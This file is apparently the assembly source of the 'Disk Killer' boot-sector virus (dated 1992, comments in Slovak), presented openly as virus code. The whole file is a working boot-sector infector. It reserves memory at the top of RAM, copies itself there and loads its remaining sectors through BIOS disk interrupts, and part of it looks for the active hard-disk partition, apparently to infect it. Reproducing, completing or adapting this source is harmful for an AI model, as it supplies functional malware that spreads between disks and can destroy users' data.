; -----------------------------------------------------------------------
;   Virus Disk Killer [Killer]      Sourced by Roman_S   (c) jan 1992
;
; Umiestnenie:  Boot sector - subor Killer1 (360 or 1.2 Mb)
;       Cyl 9, Side 0, Sect 5,6,7,8,  OLD_BOOT 9  - subor Killer2
; -----------------------------------------------------------------------
        NOSMART             ;Vypni optimalizaciu TASM

Ram_Top     equ     413h


data_14     equ 1f3h
data_15     equ 1f4h
data_16     equ 1f5h
data_17     equ 1f7h
data_19e    equ 8A2h
data_20e    equ 8A3h
data_22e    equ 8A5h
data_23e    equ 0Bh
data_24e    equ 18h
data_25e    equ 1Ah
data_26e    equ 42h
data_27e    equ 44h
data_28e    equ 46h
data_29e    equ 48h
drive       equ     4Ah
head        equ     13Fh
data_32e    equ 140h
data_33e    equ 141h

killer1     segment byte public
        assume  cs:killer1, ds:killer1

        org 0
start:      cli                 ;Disable interrupt
        jmp short run_virus
        db  'MSDOS3.3'
        db  0, 2, 2, 1, 0, 2
        db  70h, 0, 0D0h, 2, 0FDh, 2
        db  0
data_2      dw  9
data_3      dw  2
        db  19 dup (0)
        db  12h, 0, 0, 0, 0, 1
        db  0, 0FAh, 33h, 0C0h, 8Eh, 0D0h
        db  0BCh, 0, 0, 0CBh, 3Ch, 0AAh
        db  0
data_5      dw  0A6h
data_6      dw  0
data_7      dw  4Ch
data_8      dw  0
data_9      db  0
        db  55h, 0, 0, 0, 0, 55h
        db  55h

; ------------------------------------------------------------------------
run_virus:  mov ax,cs:Ram_Top
        mov cl,6
        shl ax,cl
        mov ds,ax           ;DS = Ram top segment
        cmp word ptr ds:3eh,3CCBh
        jne loc_1
        push    ds
        lea ax,cs:[23Bh]        ;Load effective addr
        push    ax
        sti             ;Enable interrupts
        retf

loc_1:      mov ax,7C00h        ;Nastavenie zasobnika
        mov cl,4
        shr ax,cl
        mov cx,cs
        add ax,cx
        mov ds,ax           ;71D4 segment
        mov es,ax
        mov ss,cx
        mov sp,0F000h
        sti             ;Enable interrupts
        mov ds:drive,dl
        mov cx,4
        mov bx,ds:data_23e      ;(7B00:000B=0)
        mov ax,ds:data_26e      ;(7B00:0042=0)
        mov ds:data_28e,ax      ;(7B00:0046=0)
        mov dx,ds:data_27e      ;(7B00:0044=0)
        mov ds:data_29e,dx      ;(7B00:0048=0)
  
locloop_2:  push    cx          ;Backup CX1
        call    sub_2
        mov cx,3            ;Set error counter
  
locloop_3:  push    cx          ;Backup CX2
        mov al,1
        call    sub_3
        pop cx          ;Restore CX2
        jnc read_ok
        mov ah,0            ;Reset disk
        int 13h
        loop    locloop_3       ;Loop & Dec error counter
        int 18h         ;ROM basic

read_ok:    call    sub_1
        mov ax,ds:data_28e      ;(7B00:0046=0)
        mov dx,ds:data_29e      ;(7B00:0048=0)
        add bx,ds:data_23e      ;(7B00:000B=0)
        pop cx          ;Restore CX1
        loop    locloop_2       ;Loop if cx > 0
  
        mov ax,cs:Ram_Top
        sub ax,8            ;Reserved 8 Kb
        mov cs:Ram_Top,ax       ;Set new value
        mov cl,6
        shl ax,cl           ;Conver to segment addres
        mov es,ax
        mov si,0
        mov di,0
        mov cx,0A00h        ;Virus len
        cld
        rep movsb           ;Copy virus to Ram Top
        push    es
        mov ax,ds:data_23e      ;(7B00:000B=0)
        push    ax
        retf                ;Jmp far to continue

; -----------------------------------------------------------------------
;
; -----------------------------------------------------------------------
sub_1:      mov ax,ds:data_28e      ;0046
        inc ax
        mov ds:data_28e,ax
        jnc no_carry
        inc word ptr ds:data_29e    ;0048
no_carry:   retn
  
  
; -------------------------------------------------------------------------
;
; -------------------------------------------------------------------------  
sub_2:      div word ptr ds:data_24e    ;(7B00:0018=0) ax,dxrem=dx:ax/data
        inc dl
        mov ds:data_32e,dl      ;(7B00:0140=0)
        xor dx,dx           ;Zero register
        div word ptr ds:data_25e    ;(7B00:001A=0) ax,dxrem=dx:ax/data
        mov ds:head,dl
        mov ds:data_33e,ax      ;(7B00:0141=0)
        retn

  
nutena:     mov ax,data_12      ;(7340:0141=9)
        mov cx,data_3       ;(7340:001A=2)
        mul cx          ;dx:ax = reg * ax
        add al,data_10      ;(7340:013F=0)
        adc ah,0
        mov cx,data_2       ;(7340:0018=9)
        mul cx          ;dx:ax = reg * ax
        mov cl,data_11      ;(7340:0140=9)
        dec cl
        add al,cl
        adc ah,0
        adc dx,0
        mov data_7,ax       ;(7340:0046=4Ch)
        mov data_5,ax       ;(7340:0042=0A6h)
        mov data_8,dx       ;(7340:0048=0)
        mov data_6,dx       ;(7340:0044=0)
        retn
data_10     db  0
data_11     db  9
data_12     dw  9
  
; --------------------------------------------------------------------------
;
; --------------------------------------------------------------------------  
sub_3:      mov ah,2
        jmp short loc_6
        db  0B4h,3,0EBh,0

loc_6:      mov dx,ds:data_33e      ;(7B00:0141=0)
        mov cl,6
        shl dh,cl           ;Shift w/zeros fill
        or  dh,ds:data_32e      ;(7B00:0140=0)
        mov cx,dx
        xchg    ch,cl
        mov dl,ds:drive
        mov dh,ds:head
        int 13h         ;Disk I/O
        retn
  
        db  0, 0F6h, 6, 4Ah, 0, 80h
        db  74h, 5Ah, 0E8h, 57h, 0, 72h
        db  72h, 53h, 0B9h, 4, 0, 0BBh
        db  0BEh, 1
  
locloop_7:  mov ah,ds:data_19e[bx]  ;(7340:08A2=0)
        cmp ah,80h
        je  loc_8           ;Jump if equal
        add bx,10h
        loop    locloop_7       ;Loop if cx > 0
  
        mov byte ptr ds:data_14,0FFh ;(7340:01F3=0)
        nop
        jmp short loc_11
        nop

loc_8:      mov dl,data_9       ;(7340:004A=0)
        mov ds:data_15,dl       ;(7340:01F4=80h)
        mov ax,ds:data_20e[bx]  ;(7340:08A3=0)
        and ah,63
        mov ds:data_16,ax       ;(7340:01F5=101h)
        mov ah,byte ptr ds:data_20e+1[bx]   ; (7340:08A4=0)
        mov cl,6
        shr ah,cl           ;Shift w/zeros fill
        mov al,ds:data_22e[bx]  ;(7340:08A5=0)
        mov ds:data_17,ax       ;(7340:01F7=0)
        mov byte ptr ds:data_14,55h ;(7340:01F3=0) 'U'
        nop
        pop bx
        mov ax,ds:data_17       ;(7340:01F7=0)
        mov data_12,ax      ;(7340:0141=9)
        mov ax,ds:data_16       ;(7340:01F5=101h)
        mov word ptr data_10,ax ;(7340:013F=900h)
        jmp short loc_9

        db  90h, 0B8h, 0, 0, 0A3h, 41h
        db  1, 0FEh, 0C4h, 0A3h, 3Fh, 1
loc_9:      mov cx,3
        mov al,1
  
locloop_10: push    cx          ;Backup
        call    sub_3
        pop cx          ;Restore
        jnc loc_12
        mov ah,0
        int 83h
        loop    locloop_10      ;Loop if cx > 0
  
loc_11:     stc             ;Set carry flag
        retn
loc_12:     clc             ;Clear carry flag
        retn

; --------------------------------------------------------------------------
        db  11 dup (0)
        db  80h
        dw  101h
        db  0,0,0,0,0,0,0
        dw  0AA55h
  
killer1     ends
        end start
        